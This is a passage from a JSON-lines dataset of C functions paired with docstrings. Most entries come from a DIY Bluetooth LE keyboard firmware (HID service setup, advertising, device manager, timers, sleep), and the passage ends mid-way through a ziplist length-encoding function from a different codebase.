{"docstring": "/**@brief Function for handling the Device Manager events.\n *\n * @param[in]   p_evt   Data associated to the device manager event.\n */\n", "func_signal": "static uint32_t device_manager_evt_handler(dm_handle_t const    * p_handle,\n                                           dm_event_t const     * p_event,\n                                           ret_code_t           event_result)", "code": "{\n    APP_ERROR_CHECK(event_result);\n\n    switch(p_event->event_id)\n    {\n        case DM_EVT_DEVICE_CONTEXT_LOADED: // Fall through.\n        case DM_EVT_SECURITY_SETUP_COMPLETE:\n            m_bonded_peer_handle = (*p_handle);\n            break;\n    }\n\n    return NRF_SUCCESS;\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing HID Service.\n */\n", "func_signal": "static void hids_init(void)", "code": "{\n    uint32_t                   err_code;\n    ble_hids_init_t            hids_init_obj;\n    ble_hids_inp_rep_init_t    input_report_array[1];\n    ble_hids_inp_rep_init_t  * p_input_report;\n    ble_hids_outp_rep_init_t   output_report_array[1];\n    ble_hids_outp_rep_init_t * p_output_report;\n    uint8_t                    hid_info_flags;\n\n    memset((void *)input_report_array, 0, sizeof(ble_hids_inp_rep_init_t));\n    memset((void *)output_report_array, 0, sizeof(ble_hids_outp_rep_init_t));\n    \n    static uint8_t report_map_data[] =\n    {\n        0x05, 0x01,                 // Usage Page (Generic Desktop)\n        0x09, 0x06,                 // Usage (Keyboard)\n        0xA1, 0x01,                 // Collection (Application)\n        0x05, 0x07,                 //     Usage Page (Key Codes)\n        0x19, 0xe0,                 //     Usage Minimum (224)\n        0x29, 0xe7,                 //     Usage Maximum (231)\n        0x15, 0x00,                 //     Logical Minimum (0)\n        0x25, 0x01,                 //     Logical Maximum (1)\n        0x75, 0x01,                 //     Report Size (1)\n        0x95, 0x08,                 //     Report Count (8)\n        0x81, 0x02,                 //     Input (Data, Variable, Absolute)\n\n        0x95, 0x01,                 //     Report Count (1)\n        0x75, 0x08,                 //     Report Size (8)\n        0x81, 0x01,                 //     Input (Constant) reserved byte(1)\n\n        0x95, 0x05,                 //     Report Count (5)\n        0x75, 0x01,                 //     Report Size (1)\n        0x05, 0x08,                 //     Usage Page (Page# for LEDs)\n        0x19, 0x01,                 //     Usage Minimum (1)\n        0x29, 0x05,                 //     Usage Maximum (5)\n        0x91, 0x02,                 //     Output (Data, Variable, Absolute), Led report\n        0x95, 0x01,                 //     Report Count (1)\n        0x75, 0x03,                 //     Report Size (3)\n        0x91, 0x01,                 //     Output (Data, Variable, Absolute), Led report padding\n\n        0x95, 0x06,                 //     Report Count (6)\n        0x75, 0x08,                 //     Report Size (8)\n        0x15, 0x00,                 //     Logical Minimum (0)\n        0x25, 0x65,                 //     Logical Maximum (101)\n        0x05, 0x07,                 //     Usage Page (Key codes)\n        0x19, 0x00,                 //     Usage Minimum (0)\n        0x29, 0x65,                 //     Usage Maximum (101)\n        0x81, 0x00,                 //     Input (Data, Array) Key array(6 bytes)\n\n        0x09, 0x05,                 //     Usage (Vendor Defined)\n        0x15, 0x00,                 //     Logical Minimum (0)\n        0x26, 0xFF, 0x00,           //     Logical Maximum (255)\n        0x75, 0x08,                 //     Report Count (2)\n        0x95, 0x02,                 //     Report Size (8 bit)\n        0xB1, 0x02,                 //     Feature (Data, Variable, Absolute)\n\n        0xC0                        // End Collection (Application)\n    };\n\n    // Initialize HID Service\n    p_input_report                      = &input_report_array[INPUT_REPORT_KEYS_INDEX];\n    p_input_report->max_len             = INPUT_REPORT_KEYS_MAX_LEN;\n    p_input_report->rep_ref.report_id   = INPUT_REP_REF_ID;\n    p_input_report->rep_ref.report_type = BLE_HIDS_REP_TYPE_INPUT;\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&p_input_report->security_mode.cccd_write_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&p_input_report->security_mode.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&p_input_report->security_mode.write_perm);\n\n    p_output_report                      = &output_report_array[OUTPUT_REPORT_INDEX];\n    p_output_report->max_len             = OUTPUT_REPORT_MAX_LEN;\n    p_output_report->rep_ref.report_id   = OUTPUT_REP_REF_ID;\n    p_output_report->rep_ref.report_type = BLE_HIDS_REP_TYPE_OUTPUT;\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&p_output_report->security_mode.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&p_output_report->security_mode.write_perm);\n\n    hid_info_flags = HID_INFO_FLAG_REMOTE_WAKE_MSK | HID_INFO_FLAG_NORMALLY_CONNECTABLE_MSK;\n\n    memset(&hids_init_obj, 0, sizeof(hids_init_obj));\n\n    hids_init_obj.evt_handler                    = on_hids_evt;\n    hids_init_obj.error_handler                  = service_error_handler;\n    hids_init_obj.is_kb                          = true;\n    hids_init_obj.is_mouse                       = false;\n    hids_init_obj.inp_rep_count                  = 1;\n    hids_init_obj.p_inp_rep_array                = input_report_array;\n    hids_init_obj.outp_rep_count                 = 1;\n    hids_init_obj.p_outp_rep_array               = output_report_array;\n    hids_init_obj.feature_rep_count              = 0;\n    hids_init_obj.p_feature_rep_array            = NULL;\n    hids_init_obj.rep_map.data_len               = sizeof(report_map_data);\n    hids_init_obj.rep_map.p_data                 = report_map_data;\n    hids_init_obj.hid_information.bcd_hid        = BASE_USB_HID_SPEC_VERSION;\n    hids_init_obj.hid_information.b_country_code = 0;\n    hids_init_obj.hid_information.flags          = hid_info_flags;\n    hids_init_obj.included_services_count        = 0;\n    hids_init_obj.p_included_services_array      = NULL;\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.rep_map.security_mode.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(&hids_init_obj.rep_map.security_mode.write_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.hid_information.security_mode.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(&hids_init_obj.hid_information.security_mode.write_perm);\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(\n        &hids_init_obj.security_mode_boot_kb_inp_rep.cccd_write_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_boot_kb_inp_rep.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(&hids_init_obj.security_mode_boot_kb_inp_rep.write_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_boot_kb_outp_rep.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_boot_kb_outp_rep.write_perm);\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_protocol.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_protocol.write_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(&hids_init_obj.security_mode_ctrl_point.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&hids_init_obj.security_mode_ctrl_point.write_perm);\n\n    err_code = ble_hids_init(&m_hids, &hids_init_obj);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for handling advertising events.\n *\n * @details This function will be called for advertising events which are passed to the application.\n *\n * @param[in] ble_adv_evt  Advertising event.\n */\n", "func_signal": "static void on_adv_evt(ble_adv_evt_t ble_adv_evt)", "code": "{\n    uint32_t err_code;\n\n    switch (ble_adv_evt)\n    {\n        case BLE_ADV_EVT_DIRECTED:\n            //!err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING_DIRECTED);\n            //!APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_ADV_EVT_FAST:\n            //!err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING);\n            //!APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_ADV_EVT_SLOW:\n            //!err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING_SLOW);\n            //!APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_ADV_EVT_FAST_WHITELIST:\n            //!err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING_WHITELIST);\n            //!APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_ADV_EVT_SLOW_WHITELIST:\n            //!err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING_WHITELIST);\n            //!APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_ADV_EVT_IDLE:\n            sleep_mode_enter();\n            break;\n\n        case BLE_ADV_EVT_WHITELIST_REQUEST:\n        {\n            ble_gap_whitelist_t whitelist;\n            ble_gap_addr_t    * p_whitelist_addr[BLE_GAP_WHITELIST_ADDR_MAX_COUNT];\n            ble_gap_irk_t     * p_whitelist_irk[BLE_GAP_WHITELIST_IRK_MAX_COUNT];\n\n            whitelist.addr_count = BLE_GAP_WHITELIST_ADDR_MAX_COUNT;\n            whitelist.irk_count  = BLE_GAP_WHITELIST_IRK_MAX_COUNT;\n            whitelist.pp_addrs   = p_whitelist_addr;\n            whitelist.pp_irks    = p_whitelist_irk;\n\n            err_code = dm_whitelist_create(&m_app_handle, &whitelist);\n            APP_ERROR_CHECK(err_code);\n\n            err_code = ble_advertising_whitelist_reply(&whitelist);\n            APP_ERROR_CHECK(err_code);\n            break;\n        }\n        case BLE_ADV_EVT_PEER_ADDR_REQUEST:\n        {\n            ble_gap_addr_t peer_address;\n\n            // Only Give peer address if we have a handle to the bonded peer.\n            if(m_bonded_peer_handle.appl_id != DM_INVALID_ID)\n            {\n                            \n                err_code = dm_peer_addr_get(&m_bonded_peer_handle, &peer_address);\n                APP_ERROR_CHECK(err_code);\n\n                err_code = ble_advertising_peer_addr_reply(&peer_address);\n                APP_ERROR_CHECK(err_code);\n                \n            }\n            break;\n        }\n        default:\n            break;\n    }\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief   Function for dispatching a system event to interested modules.\n *\n * @details This function is called from the System event interrupt handler after a system\n *          event has been received.\n *\n * @param[in]   sys_evt   System stack event.\n */\n", "func_signal": "static void sys_evt_dispatch(uint32_t sys_evt)", "code": "{\n    pstorage_sys_event_handler(sys_evt);\n    ble_advertising_on_sys_evt(sys_evt);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing Device Information Service.\n */\n", "func_signal": "static void dis_init(void)", "code": "{\n    uint32_t         err_code;\n    ble_dis_init_t   dis_init_obj;\n    ble_dis_pnp_id_t pnp_id;\n\n    pnp_id.vendor_id_source = PNP_ID_VENDOR_ID_SOURCE;\n    pnp_id.vendor_id        = PNP_ID_VENDOR_ID;\n    pnp_id.product_id       = PNP_ID_PRODUCT_ID;\n    pnp_id.product_version  = PNP_ID_PRODUCT_VERSION;\n\n    memset(&dis_init_obj, 0, sizeof(dis_init_obj));\n\n    ble_srv_ascii_to_utf8(&dis_init_obj.manufact_name_str, MANUFACTURER_NAME);\n    dis_init_obj.p_pnp_id = &pnp_id;\n\n    BLE_GAP_CONN_SEC_MODE_SET_ENC_NO_MITM(&dis_init_obj.dis_attr_md.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_NO_ACCESS(&dis_init_obj.dis_attr_md.write_perm);\n\n    err_code = ble_dis_init(&dis_init_obj);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing the Advertising functionality.\n */\n", "func_signal": "static void advertising_init(void)", "code": "{\n    uint32_t       err_code;\n    uint8_t        adv_flags;\n    ble_advdata_t  advdata;\n\n    // Build and set advertising data\n    memset(&advdata, 0, sizeof(advdata));\n\n    adv_flags                       = BLE_GAP_ADV_FLAGS_LE_ONLY_LIMITED_DISC_MODE;\n    advdata.name_type               = BLE_ADVDATA_FULL_NAME;\n    advdata.include_appearance      = true;\n    advdata.flags                   = adv_flags;\n    advdata.uuids_complete.uuid_cnt = sizeof(m_adv_uuids) / sizeof(m_adv_uuids[0]);\n    advdata.uuids_complete.p_uuids  = m_adv_uuids;\n\n    ble_adv_modes_config_t options =\n    {\n        BLE_ADV_WHITELIST_DISABLED,\n        BLE_ADV_DIRECTED_ENABLED,\n        BLE_ADV_DIRECTED_SLOW_DISABLED, 0,0,\n        BLE_ADV_FAST_ENABLED, APP_ADV_FAST_INTERVAL, APP_ADV_FAST_TIMEOUT,\n        BLE_ADV_SLOW_ENABLED, APP_ADV_SLOW_INTERVAL, APP_ADV_SLOW_TIMEOUT\n    };\n\n    err_code = ble_advertising_init(&advdata, NULL, &options, on_adv_evt, ble_advertising_error_handler);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for the Timer initialization.\n *\n * @details Initializes the timer module.\n */\n", "func_signal": "static void timers_init(void)", "code": "{\n    uint32_t err_code;\n\n    // Initialize timer module, making it use the scheduler.\n    APP_TIMER_APPSH_INIT(APP_TIMER_PRESCALER, APP_TIMER_MAX_TIMERS, APP_TIMER_OP_QUEUE_SIZE, true);\n\t// Create keyboard timer.\n    err_code = app_timer_create(&m_keyboard_timer_id,\n                                APP_TIMER_MODE_REPEATED,\n                                keyboard_scan_timeout_handler);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing buttons and leds.\n *\n * @param[out] p_erase_bonds  Will be true if the clear bonding button was pressed to wake the application up.\n */\n", "func_signal": "static void keyboard_LED_init(void)", "code": "{\n\t\tnrf_gpio_cfg_output(16);\t//Capslock_LED+\n\t\tnrf_gpio_cfg_output(17);\t//Capslock_LED-\n\t\tnrf_gpio_pin_clear(16);\n\t\tnrf_gpio_pin_clear(17);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for handling the keyboard scan timer timeout.\n *\n * @details This function will be called each time the keyboard scan timer expires.\n *\n */\n", "func_signal": "static void keyboard_scan_timeout_handler(void * p_context)", "code": "{\n\tconst uint8_t *key_packet;\n    uint8_t        key_packet_size;\n    if (keyboard_new_packet(&key_packet, &key_packet_size))\n    {\n\t\t\tif(key_packet[2] == 0xFA){\n\t\t\t\tsleep_mode_enter();\n\t\t\t}else{\n\t\t\t\tif (m_conn_handle != BLE_CONN_HANDLE_INVALID)\n\t\t\t\t{\n\t\t\t\t\tkeys_send(key_packet_size,(uint8_t *)&key_packet[0]);\n\t\t\t\t}\n\t\t\t}\t\n\t}\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing the Connection Parameters module.\n */\n", "func_signal": "static void conn_params_init(void)", "code": "{\n    uint32_t               err_code;\n    ble_conn_params_init_t cp_init;\n\n    memset(&cp_init, 0, sizeof(cp_init));\n\n    cp_init.p_conn_params                  = NULL;\n    cp_init.first_conn_params_update_delay = FIRST_CONN_PARAMS_UPDATE_DELAY;\n    cp_init.next_conn_params_update_delay  = NEXT_CONN_PARAMS_UPDATE_DELAY;\n    cp_init.max_conn_params_update_count   = MAX_CONN_PARAMS_UPDATE_COUNT;\n    cp_init.start_on_notify_cccd_handle    = BLE_GATT_HANDLE_INVALID;\n    cp_init.disconnect_on_fail             = false;\n    cp_init.evt_handler                    = NULL;\n    cp_init.error_handler                  = conn_params_error_handler;\n\n    err_code = ble_conn_params_init(&cp_init);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing services that will be used by the application.\n */\n", "func_signal": "static void services_init(void)", "code": "{\n    dis_init();\n    hids_init();\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for the GAP initialization.\n *\n * @details This function sets up all the necessary GAP (Generic Access Profile) parameters of the\n *          device including the device name, appearance, and the preferred connection parameters.\n */\n", "func_signal": "static void gap_params_init(void)", "code": "{\n    uint32_t                err_code;\n    ble_gap_conn_params_t   gap_conn_params;\n    ble_gap_conn_sec_mode_t sec_mode;\n\n    BLE_GAP_CONN_SEC_MODE_SET_OPEN(&sec_mode);\n\n    err_code = sd_ble_gap_device_name_set(&sec_mode,\n                                          (const uint8_t *)DEVICE_NAME,\n                                          strlen(DEVICE_NAME));\n    APP_ERROR_CHECK(err_code);\n\n    err_code = sd_ble_gap_appearance_set(BLE_APPEARANCE_HID_KEYBOARD);\n    APP_ERROR_CHECK(err_code);\n\n    memset(&gap_conn_params, 0, sizeof(gap_conn_params));\n\n    gap_conn_params.min_conn_interval = MIN_CONN_INTERVAL;\n    gap_conn_params.max_conn_interval = MAX_CONN_INTERVAL;\n    gap_conn_params.slave_latency     = SLAVE_LATENCY;\n    gap_conn_params.conn_sup_timeout  = CONN_SUP_TIMEOUT;\n\n    err_code = sd_ble_gap_ppcp_set(&gap_conn_params);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for the Device Manager initialization.\n *\n * @param[in] erase_bonds  Indicates whether bonding information should be cleared from\n *                         persistent storage during initialization of the Device Manager.\n */\n", "func_signal": "static void device_manager_init(bool erase_bonds)", "code": "{\n    uint32_t               err_code;\n    dm_init_param_t        init_param = {.clear_persistent_data = erase_bonds};\n    dm_application_param_t  register_param;\n\n    // Initialize peer device handle.\n    err_code = dm_handle_initialize(&m_bonded_peer_handle);\n    APP_ERROR_CHECK(err_code);\n    \n    // Initialize persistent storage module.\n    err_code = pstorage_init();\n    APP_ERROR_CHECK(err_code);\n\n    err_code = dm_init(&init_param);\n    APP_ERROR_CHECK(err_code);\n    \n    memset(&register_param.sec_param, 0, sizeof(ble_gap_sec_params_t));\n\n    register_param.sec_param.bond         = SEC_PARAM_BOND;\n    register_param.sec_param.mitm         = SEC_PARAM_MITM;\n    register_param.sec_param.io_caps      = SEC_PARAM_IO_CAPABILITIES;\n    register_param.sec_param.oob          = SEC_PARAM_OOB;\n    register_param.sec_param.min_key_size = SEC_PARAM_MIN_KEY_SIZE;\n    register_param.sec_param.max_key_size = SEC_PARAM_MAX_KEY_SIZE;\n    register_param.evt_handler            = device_manager_evt_handler;\n    register_param.service_type           = DM_PROTOCOL_CNTXT_GATT_SRVR_ID;\n\n    err_code = dm_register(&m_app_handle, &register_param);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for initializing the BLE stack.\n *\n * @details Initializes the SoftDevice and the BLE event interrupt.\n */\n", "func_signal": "static void ble_stack_init(void)", "code": "{\n    uint32_t err_code;\n\n    // Initialize the SoftDevice handler module.\n    SOFTDEVICE_HANDLER_APPSH_INIT(NRF_CLOCK_LFCLKSRC_XTAL_20_PPM, true);\n\n    // Enable BLE stack \n    ble_enable_params_t ble_enable_params;\n    memset(&ble_enable_params, 0, sizeof(ble_enable_params));\n#ifdef S130\n    ble_enable_params.gatts_enable_params.attr_tab_size   = BLE_GATTS_ATTR_TAB_SIZE_DEFAULT;\n#endif\n    ble_enable_params.gatts_enable_params.service_changed = IS_SRVC_CHANGED_CHARACT_PRESENT;\n    err_code = sd_ble_enable(&ble_enable_params);\n    APP_ERROR_CHECK(err_code);\n\n    // Register with the SoftDevice handler module for BLE events.\n    err_code = softdevice_ble_evt_handler_set(ble_evt_dispatch);\n    APP_ERROR_CHECK(err_code);\n\n    // Register with the SoftDevice handler module for BLE events.\n    err_code = softdevice_sys_evt_handler_set(sys_evt_dispatch);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for starting timers.\n */\n", "func_signal": "static void timers_start(void)", "code": "{\n    uint32_t err_code;\n\t\terr_code = app_timer_start(m_keyboard_timer_id, KEYBOARD_SCAN_INTERVAL, NULL);\n    APP_ERROR_CHECK(err_code);\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for application main entry.\n */\n", "func_signal": "int main(void)", "code": "{\n    uint32_t err_code;\n\t\tbool erase_bonds = false;\n    // Initialize.\n    timers_init();\n    keyboard_LED_init();\n\t\tkeyboard_init();\n    ble_stack_init();\n    scheduler_init();\n    device_manager_init(erase_bonds);\n    gap_params_init();\n    advertising_init();\n    services_init();\n    conn_params_init();\n\n    // Start execution.\n    timers_start();\n    err_code = ble_advertising_start(BLE_ADV_MODE_FAST);\n    APP_ERROR_CHECK(err_code);\n\n    // Enter main loop.\n    for (;;)\n    {\n\t\t\t\tif(sleep == true){\n\t\t\t\t\tsd_power_system_off();\n\t\t\t\t}\n        app_sched_execute();\n        power_manage();\n    }\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for handling the Application's BLE Stack events.\n *\n * @param[in]   p_ble_evt   Bluetooth stack event.\n */\n", "func_signal": "static void on_ble_evt(ble_evt_t * p_ble_evt)", "code": "{\n    uint32_t                              err_code;\n    ble_gatts_rw_authorize_reply_params_t auth_reply;\n\n    switch (p_ble_evt->header.evt_id)\n    {\n        case BLE_GAP_EVT_CONNECTED:\n            m_conn_handle      = p_ble_evt->evt.gap_evt.conn_handle;\n            break;\n        case BLE_GAP_EVT_DISCONNECTED:\n            m_conn_handle = BLE_CONN_HANDLE_INVALID;\n            m_caps_on = false;\n            break;\n        case BLE_EVT_USER_MEM_REQUEST:\n            err_code = sd_ble_user_mem_reply(m_conn_handle, NULL);\n            APP_ERROR_CHECK(err_code);\n            break;\n        case BLE_GATTS_EVT_RW_AUTHORIZE_REQUEST:\n            if(p_ble_evt->evt.gatts_evt.params.authorize_request.type\n               != BLE_GATTS_AUTHORIZE_TYPE_INVALID)\n            {\n                if ((p_ble_evt->evt.gatts_evt.params.authorize_request.request.write.op\n                     == BLE_GATTS_OP_PREP_WRITE_REQ)\n                    || (p_ble_evt->evt.gatts_evt.params.authorize_request.request.write.op\n                     == BLE_GATTS_OP_EXEC_WRITE_REQ_NOW)\n                    || (p_ble_evt->evt.gatts_evt.params.authorize_request.request.write.op\n                     == BLE_GATTS_OP_EXEC_WRITE_REQ_CANCEL))\n                {\n                    if (p_ble_evt->evt.gatts_evt.params.authorize_request.type\n                        == BLE_GATTS_AUTHORIZE_TYPE_WRITE)\n                    {\n                    auth_reply.type = BLE_GATTS_AUTHORIZE_TYPE_WRITE;\n                    }\n                    else\n                    {\n                        auth_reply.type = BLE_GATTS_AUTHORIZE_TYPE_READ;\n                    }\n                    auth_reply.params.write.gatt_status = APP_FEATURE_NOT_SUPPORTED;\n                    err_code = sd_ble_gatts_rw_authorize_reply(m_conn_handle,&auth_reply);\n                    APP_ERROR_CHECK(err_code);\n                }\n            }\n            break;\n\n        case BLE_GATTC_EVT_TIMEOUT:\n        case BLE_GATTS_EVT_TIMEOUT:\n            // Disconnect on GATT Server and Client timeout events.\n            err_code = sd_ble_gap_disconnect(m_conn_handle,\n                                             BLE_HCI_REMOTE_USER_TERMINATED_CONNECTION);\n            APP_ERROR_CHECK(err_code);\n            break;\n\n        default:\n            // No implementation needed.\n            break;\n    }\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for handling HID events.\n *\n * @details This function will be called for all HID events which are passed to the application.\n *\n * @param[in]   p_hids  HID service structure.\n * @param[in]   p_evt   Event received from the HID service.\n */\n", "func_signal": "static void on_hids_evt(ble_hids_t * p_hids, ble_hids_evt_t *p_evt)", "code": "{\n    switch (p_evt->evt_type)\n    {\n        case BLE_HIDS_EVT_BOOT_MODE_ENTERED:\n            m_in_boot_mode = true;\n            break;\n\n        case BLE_HIDS_EVT_REPORT_MODE_ENTERED:\n            m_in_boot_mode = false;\n            break;\n\n        case BLE_HIDS_EVT_REP_CHAR_WRITE:\n            on_hid_rep_char_write(p_evt);\n            break;\n\n        case BLE_HIDS_EVT_NOTIF_ENABLED:\n        {\n            dm_service_context_t   service_context;\n            service_context.service_type = DM_PROTOCOL_CNTXT_GATT_SRVR_ID;\n            service_context.context_data.len = 0;\n            service_context.context_data.p_data = NULL;\n\n            if (m_in_boot_mode)\n            {\n                // Protocol mode is Boot Protocol mode.\n                if (\n                    p_evt->params.notification.char_id.uuid\n                    ==\n                    BLE_UUID_BOOT_KEYBOARD_INPUT_REPORT_CHAR\n                )\n                {\n                    // The notification of boot keyboard input report has been enabled.\n                    // Save the system attribute (CCCD) information into the flash.\n                    uint32_t err_code;\n\n                    err_code = dm_service_context_set(&m_bonded_peer_handle, &service_context);\n                    if (err_code != NRF_ERROR_INVALID_STATE)\n                    {\n                        APP_ERROR_CHECK(err_code);\n                    }\n                    else\n                    {\n                        // The system attributes could not be written to the flash because\n                        // the connected central is not a new central. The system attributes\n                        // will only be written to flash only when disconnected from this central.\n                        // Do nothing now.\n                    }\n                }\n                else\n                {\n                    // Do nothing.\n                }\n            }\n            else if (p_evt->params.notification.char_id.rep_type == BLE_HIDS_REP_TYPE_INPUT)\n            {\n                // The protocol mode is Report Protocol mode. And the CCCD for the input report\n                // is changed. It is now time to store all the CCCD information (system\n                // attributes) into the flash.\n                uint32_t err_code;\n\n                err_code = dm_service_context_set(&m_bonded_peer_handle, &service_context);\n                if (err_code != NRF_ERROR_INVALID_STATE)\n                {\n                    APP_ERROR_CHECK(err_code);\n                }\n                else\n                {\n                    // The system attributes could not be written to the flash because\n                    // the connected central is not a new central. The system attributes\n                    // will only be written to flash only when disconnected from this central.\n                    // Do nothing now.\n                }\n            }\n            else\n            {\n                // The notification of the report that was enabled by the central is not interesting\n                // to this application. So do nothing.\n            }\n            break;\n        }\n\n        default:\n            // No implementation needed.\n            break;\n    }\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/**@brief Function for putting the chip into sleep mode.\n *\n * @note This function will not return.\n */\n", "func_signal": "static void sleep_mode_enter(void)", "code": "{\n\t\tapp_timer_stop_all();\n\t\tsleep_mode_prepare();\n\t\tsleep = true;\n}", "path": "BLE-Keyboard\\main.c", "repo_name": "I0x0I/DIY-A-BLE-Keyboard", "stars": 115, "license": "gpl-2.0", "language": "c", "size": 180}
{"docstring": "/* Encode the length 'rawlen' writing it in 'p'. If p is NULL it just returns\n * the amount of bytes required to encode such a length. */\n/* \u5c06\u7f16\u7801\u65b9\u5f0fencoding\u548c\u6570\u636e\u957f\u5ea6rawlen\u8fdb\u884c\u7f16\u7801\u5e76\u5199\u5165p\u6307\u5411\u7684\u7f13\u51b2\u533a\u4e2d\uff0c\u8fd4\u56de\u4fdd\u5b58\u8be5\u7f16\u7801\u6240\u5360\u7528\u7684\u5b57\u8282\u6570 */\n", "func_signal": "static unsigned int zipEncodeLength(unsigned char *p, unsigned char encoding, unsigned int rawlen)", "code": "{\n    unsigned char len = 1, buf[5];\n\n    if (ZIP_IS_STR(encoding)) {\n        // \u5904\u7406\u5b57\u7b26\u4e32\u7f16\u7801\n        /* Although encoding is given it may not be set for strings,\n         * so we determine it here using the raw length. */\n        if (rawlen <= 0x3f) {\n            // \u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e\u7b49\u4e8e63\uff0c\u4e3a00\u7f16\u7801\u7c7b\u578b\n            if (!p) return len;\n            buf[0] = ZIP_STR_06B | rawlen;\n        } else if (rawlen <= 0x3fff) {\n            // \u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e\u7b49\u4e8e16383\uff082^14 - 1\uff09\uff0c\u4e3a01\u7f16\u7801\u7c7b\u578b\n            len += 1;\n            if (!p) return len;\n            buf[0] = ZIP_STR_14B | ((rawlen >> 8) & 0x3f);\n            buf[1] = rawlen & 0xff;\n        } else {\n            // 